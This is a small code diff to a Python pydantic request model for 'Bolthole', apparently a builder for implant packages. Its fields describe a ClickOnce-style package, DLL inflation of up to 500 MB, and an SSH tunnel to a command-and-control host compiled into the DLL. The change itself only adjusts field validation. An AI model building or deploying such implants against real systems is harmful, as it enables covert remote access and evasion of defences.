@@ -3,7 +3,7 @@ Models for Bolthole build requests
 """
 
 import re
-from pydantic import BaseModel, field_validator
+from pydantic import BaseModel, Field, field_validator
 
 
 class BoltholePayload(BaseModel):
@@ -14,7 +14,7 @@ class BoltholePayload(BaseModel):
     provider_url: str = ""  # HTTPS URL for deploymentProvider in .application (optional)
     version: str        # app version string (e.g. "1.0.0.0")
     inflate: int        # MB to inflate DLL (0–500)
-    files_prefix: str = "bolt"  # prefix for bolt* filenames in the package (e.g. "shadow" → ShadowFiles/)
+    files_prefix: str = Field(default="bolt", validate_default=True)  # prefix for bolt* filenames in the package (e.g. "shadow" → ShadowFiles/)
     # Section B — Bolthole SSH tunnel (values compiled into the DLL)
     ssh_host: str       # C2 FQDN or IP
     ssh_user: str       # SSH username on C2
